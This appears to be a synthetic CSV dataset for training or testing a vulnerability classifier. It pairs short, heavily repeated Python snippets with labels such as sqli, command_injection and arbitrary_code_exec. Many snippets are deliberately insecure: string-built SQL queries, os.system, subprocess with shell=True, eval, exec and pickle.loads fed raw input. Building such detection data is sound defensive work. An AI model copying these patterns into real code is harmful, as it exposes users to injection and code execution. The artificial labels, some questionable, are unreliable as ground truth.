snippet,vulnerability
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"import os
os.system(input('Command: '))
eval(input('Expression: '))","['command_injection', 'arbitrary_code_exec']"
"def add(a, b):
    return a + b
print(add(2, 3))
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['command_injection', 'buffer_overflow']"
"name = input('Enter your name: ')
print(f'Hi, {name}')
query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['sqli', 'buffer_overflow']"
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"print('Hello, world!')",['none']
"import os
os.system(input('Command: '))",['command_injection']
eval(input('Expression: ')),['arbitrary_code_exec']
"import os
os.system(input('Command: '))",['command_injection']
"def add(a, b):
    return a + b
print(add(2, 3))
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"eval(input('Expression: '))
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['arbitrary_code_exec', 'buffer_overflow']"
"print('Hello, world!')",['none']
"exec(input('Code: '))
def add(a, b):
    return a + b
print(add(2, 3))",['arbitrary_code_exec']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)","['command_injection', 'sqli']"
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
def add(a, b):
    return a + b
print(add(2, 3))",['command_injection']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['sqli', 'buffer_overflow']"
"import os
os.system(input('Command: '))
name = input('Enter your name: ')
print(f'Hi, {name}')",['command_injection']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['command_injection', 'buffer_overflow']"
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
name = input('Enter your name: ')
print(f'Hi, {name}')",['command_injection']
"import os
os.system(input('Command: '))",['command_injection']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"name = input('Enter your name: ')
print(f'Hi, {name}')
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"import os
os.system(input('Command: '))
exec(input('Code: '))","['command_injection', 'arbitrary_code_exec']"
exec(input('Code: ')),['arbitrary_code_exec']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"import pickle
pickle.loads(input('Serialized data: '))
name = input('Enter your name: ')
print(f'Hi, {name}')",['arbitrary_code_exec']
"import os
os.system(input('Command: '))",['command_injection']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"import os
os.system(input('Command: '))",['command_injection']
"print('Hello, world!')
query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"print('Hello, world!')",['none']
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"exec(input('Code: '))
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['arbitrary_code_exec', 'buffer_overflow']"
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"print('Hello, world!')
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"def add(a, b):
    return a + b
print(add(2, 3))
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"eval(input('Expression: '))
print('Hello, world!')",['arbitrary_code_exec']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"exec(input('Code: '))
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['arbitrary_code_exec', 'buffer_overflow']"
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"import os
os.system(input('Command: '))",['command_injection']
eval(input('Expression: ')),['arbitrary_code_exec']
"name = input('Enter your name: ')
print(f'Hi, {name}')
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"import os
os.system(input('Command: '))",['command_injection']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['sqli', 'buffer_overflow']"
"def add(a, b):
    return a + b
print(add(2, 3))
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['sqli', 'buffer_overflow']"
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"import os
os.system(input('Command: '))
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")","['command_injection', 'sqli']"
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"exec(input('Code: '))
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['arbitrary_code_exec', 'buffer_overflow']"
"import pickle
pickle.loads(input('Serialized data: '))",['arbitrary_code_exec']
"import pickle
pickle.loads(input('Serialized data: '))
print('Hello, world!')",['arbitrary_code_exec']
exec(input('Code: ')),['arbitrary_code_exec']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
eval(input('Expression: '))","['command_injection', 'arbitrary_code_exec']"
"import os
os.system(input('Command: '))
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")","['command_injection', 'sqli']"
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"import os
os.system(input('Command: '))
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['command_injection', 'buffer_overflow']"
exec(input('Code: ')),['arbitrary_code_exec']
"import pickle
pickle.loads(input('Serialized data: '))",['arbitrary_code_exec']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)","['command_injection', 'sqli']"
exec(input('Code: ')),['arbitrary_code_exec']
"name = input('Enter your name: ')
print(f'Hi, {name}')
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['sqli', 'buffer_overflow']"
"exec(input('Code: '))
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['arbitrary_code_exec', 'buffer_overflow']"
"import pickle
pickle.loads(input('Serialized data: '))
print('Hello, world!')",['arbitrary_code_exec']
"import os
os.system(input('Command: '))",['command_injection']
"eval(input('Expression: '))
def add(a, b):
    return a + b
print(add(2, 3))",['arbitrary_code_exec']
exec(input('Code: ')),['arbitrary_code_exec']
"print('Hello, world!')",['none']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"def add(a, b):
    return a + b
print(add(2, 3))
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
eval(input('Expression: ')),['arbitrary_code_exec']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"import os
os.system(input('Command: '))
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['command_injection', 'buffer_overflow']"
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['command_injection', 'buffer_overflow']"
exec(input('Code: ')),['arbitrary_code_exec']
"import pickle
pickle.loads(input('Serialized data: '))
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['arbitrary_code_exec', 'buffer_overflow']"
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
print('Hello, world!')",['command_injection']
"print('Hello, world!')",['none']
"import os
os.system(input('Command: '))
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")","['command_injection', 'sqli']"
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
exec(input('Code: ')),['arbitrary_code_exec']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")","['command_injection', 'sqli']"
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"import pickle
pickle.loads(input('Serialized data: '))",['arbitrary_code_exec']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"name = input('Enter your name: ')
print(f'Hi, {name}')
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"def add(a, b):
    return a + b
print(add(2, 3))
query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"print('Hello, world!')",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"import pickle
pickle.loads(input('Serialized data: '))
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['arbitrary_code_exec', 'buffer_overflow']"
"eval(input('Expression: '))
print('Hello, world!')",['arbitrary_code_exec']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['command_injection', 'buffer_overflow']"
"import pickle
pickle.loads(input('Serialized data: '))",['arbitrary_code_exec']
"import os
os.system(input('Command: '))
eval(input('Expression: '))","['command_injection', 'arbitrary_code_exec']"
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"exec(input('Code: '))
query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)","['arbitrary_code_exec', 'sqli']"
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")","['command_injection', 'sqli']"
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"import pickle
pickle.loads(input('Serialized data: '))",['arbitrary_code_exec']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"import os
os.system(input('Command: '))
def add(a, b):
    return a + b
print(add(2, 3))",['command_injection']
exec(input('Code: ')),['arbitrary_code_exec']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"print('Hello, world!')",['none']
"name = input('Enter your name: ')
print(f'Hi, {name}')
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
name = input('Enter your name: ')
print(f'Hi, {name}')",['command_injection']
"import os
os.system(input('Command: '))
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")","['command_injection', 'sqli']"
exec(input('Code: ')),['arbitrary_code_exec']
eval(input('Expression: ')),['arbitrary_code_exec']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
name = input('Enter your name: ')
print(f'Hi, {name}')",['command_injection']
"import os
os.system(input('Command: '))
name = input('Enter your name: ')
print(f'Hi, {name}')",['command_injection']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"import os
os.system(input('Command: '))
print('Hello, world!')",['command_injection']
"name = input('Enter your name: ')
print(f'Hi, {name}')
query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"import pickle
pickle.loads(input('Serialized data: '))",['arbitrary_code_exec']
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"eval(input('Expression: '))
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")","['arbitrary_code_exec', 'sqli']"
"import os
os.system(input('Command: '))",['command_injection']
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"print('Hello, world!')
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"import os
os.system(input('Command: '))
exec(input('Code: '))","['command_injection', 'arbitrary_code_exec']"
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"print('Hello, world!')
query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['command_injection', 'buffer_overflow']"
"import os
os.system(input('Command: '))
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['command_injection', 'buffer_overflow']"
"import pickle
pickle.loads(input('Serialized data: '))
print('Hello, world!')",['arbitrary_code_exec']
"import pickle
pickle.loads(input('Serialized data: '))",['arbitrary_code_exec']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"import os
os.system(input('Command: '))
name = input('Enter your name: ')
print(f'Hi, {name}')",['command_injection']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"import pickle
pickle.loads(input('Serialized data: '))
print('Hello, world!')",['arbitrary_code_exec']
"name = input('Enter your name: ')
print(f'Hi, {name}')
query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['sqli', 'buffer_overflow']"
eval(input('Expression: ')),['arbitrary_code_exec']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"exec(input('Code: '))
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")","['arbitrary_code_exec', 'sqli']"
"import os
os.system(input('Command: '))",['command_injection']
"for i in range(5):
    print(i)",['none']
"import os
os.system(input('Command: '))",['command_injection']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"import os
os.system(input('Command: '))
exec(input('Code: '))","['command_injection', 'arbitrary_code_exec']"
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"for i in range(5):
    print(i)",['none']
"import os
os.system(input('Command: '))
query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)","['command_injection', 'sqli']"
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
eval(input('Expression: '))","['command_injection', 'arbitrary_code_exec']"
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()
exec(input('Code: '))","['buffer_overflow', 'arbitrary_code_exec']"
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
import pickle
pickle.loads(input('Serialized data: '))","['command_injection', 'arbitrary_code_exec']"
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"import os
os.system(input('Command: '))
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")","['command_injection', 'sqli']"
"for i in range(5):
    print(i)",['none']
"exec(input('Code: '))
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['arbitrary_code_exec', 'buffer_overflow']"
"print('Hello, world!')",['none']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['sqli', 'buffer_overflow']"
"for i in range(5):
    print(i)",['none']
"import os
os.system(input('Command: '))
import pickle
pickle.loads(input('Serialized data: '))","['command_injection', 'arbitrary_code_exec']"
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['sqli', 'buffer_overflow']"
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)
eval(input('Expression: '))","['sqli', 'arbitrary_code_exec']"
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"import os
os.system(input('Command: '))",['command_injection']
"print('Hello, world!')",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['command_injection', 'buffer_overflow']"
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")
import subprocess
subprocess.call(input('Enter command: '), shell=True)","['sqli', 'command_injection']"
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"import os
os.system(input('Command: '))
eval(input('Expression: '))","['command_injection', 'arbitrary_code_exec']"
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"eval(input('Expression: '))
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['arbitrary_code_exec', 'buffer_overflow']"
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"eval(input('Expression: '))
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['arbitrary_code_exec', 'buffer_overflow']"
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
import pickle
pickle.loads(input('Serialized data: '))","['command_injection', 'arbitrary_code_exec']"
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"import pickle
pickle.loads(input('Serialized data: '))",['arbitrary_code_exec']
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()
eval(input('Expression: '))","['buffer_overflow', 'arbitrary_code_exec']"
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"import os
os.system(input('Command: '))
query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)","['command_injection', 'sqli']"
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()
exec(input('Code: '))","['buffer_overflow', 'arbitrary_code_exec']"
"print('Hello, world!')",['none']
eval(input('Expression: ')),['arbitrary_code_exec']
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()
eval(input('Expression: '))","['buffer_overflow', 'arbitrary_code_exec']"
"for i in range(5):
    print(i)",['none']
eval(input('Expression: ')),['arbitrary_code_exec']
"for i in range(5):
    print(i)",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"exec(input('Code: '))
query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)","['arbitrary_code_exec', 'sqli']"
"print('Hello, world!')",['none']
